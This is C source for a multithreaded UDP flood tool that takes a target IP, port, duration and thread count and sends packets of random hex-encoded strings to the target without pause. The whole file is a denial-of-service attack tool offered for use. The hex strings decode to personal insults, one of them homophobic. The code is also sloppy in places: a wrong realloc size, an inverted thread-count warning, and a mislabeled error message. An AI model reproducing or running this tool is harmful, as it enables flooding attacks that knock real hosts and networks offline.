#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <arpa/inet.h>

//udp hex or std hex written in c by juan aka george glaskin

typedef struct atk_args {
    in_addr_t host;

    int port, seconds, psize;
} args_t;

int count = 0;
char **strings;

static void add_string(char *string, int len) {
    strings = realloc(strings, (count + 1) + len);
    strings[count++] = string;
}

static void strings_init(void) { //for easier config
    add_string("\x61\x62\x63\x31\x32\x33", 6);
    add_string("\x6d\x61\x72\x6b\x75\x73\x20\x69\x73\x20\x67\x61\x79", 14);
    add_string("\x75\x72\x30\x61\x20\x69\x73\x20\x61\x20\x73\x6b\x69\x64", 15);
}

static char *strings_rand(void) { //easier config
    return strings[rand() % count];
}

static void atk_watch(int seconds) { //higher pps
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        sleep(seconds);
        kill(getppid(), 9);
    }
}

static void *atk_udphex(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    args_t *args = (args_t *)arg;

    struct sockaddr_in addr = {
        .sin_addr.s_addr = args->host,
        .sin_port = htons(args->port),
        .sin_family = AF_INET
    };

    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    char *string = strings_rand();
    int len = strlen(string); //also packet size

    atk_watch(args->seconds);

    while(1)
        send(sock, string, len, MSG_NOSIGNAL);
}

int main(int argc, char **argv) {
    if(argc != 5) {
        printf("Usage: invalid args!\r\n%s [ip] [port] [time] [threads]\r\nExample: %s 1.1.1.1 80 20 16\r\n", argv[0], argv[0]);

        return -1;
    }

    in_addr_t host;
    int port, seconds, threads;

    if(!(host = inet_addr(argv[1]))) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }
    else if((port = atoi(argv[2])) > 65535 || port < 1) {
        printf("[main] %s is invalid\r\n", argv[2]);

        return -1;
    }
    else if((seconds = atoi(argv[3])) < 1) {
        printf("[main] %s is invalid\r\n", argv[3]);

        return -1;
    }
    else if((threads = atoi(argv[4])) < 1) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }

    strings_init();

    puts("[main] initiated strings");

    if(threads < 200)
        puts("[warning] threads are high");

    args_t args = {
        .host = host,
        .port = port,
        .seconds = seconds
    };

    pthread_t thread[threads];
    
    for(int i = 0; i < threads; i++)
        pthread_create(&thread[i], NULL, atk_udphex, (void *)&args);
    
    printf("[main] started: %d threads\n", threads);

    while(1)
        sleep(1);
}
